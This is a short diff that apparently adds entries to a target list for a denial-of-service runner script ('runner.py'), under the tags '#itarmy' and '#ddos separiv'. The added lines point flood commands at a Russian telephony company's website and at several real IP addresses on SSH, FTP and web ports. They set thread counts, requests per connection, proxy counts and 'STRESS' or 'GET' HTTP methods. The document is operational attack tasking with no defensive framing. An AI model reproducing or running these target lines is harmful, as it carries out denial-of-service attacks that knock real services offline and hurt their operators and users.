@@ -5,7 +5,8 @@ runner.py tcp://78.46.28.63:80 tcp://78.46.28.63:443 tcp://195.189.222.41:443 tc
 
 
 #itarmy
-
+http://www.telphin.ru/ip_telefoniya_v_spb/ https://www.telphin.ru -t 1500 --rpc 2000 -p 1000 --http-methods STRESS
+tcp://81.29.129.130:22 https://81.29.129.130 tcp://79.175.9.172:21 tcp://79.175.9.172:22 https://79.175.9.172 http://46.229.221.87 https://46.229.221.87 http://213.170.84.120 https://213.170.84.120 http://213.170.84.115 https://213.170.84.115 -t 1000 -p 5000 --rpc 2000 --debug --table --http-methods GET
 
 
 #ddos separiv
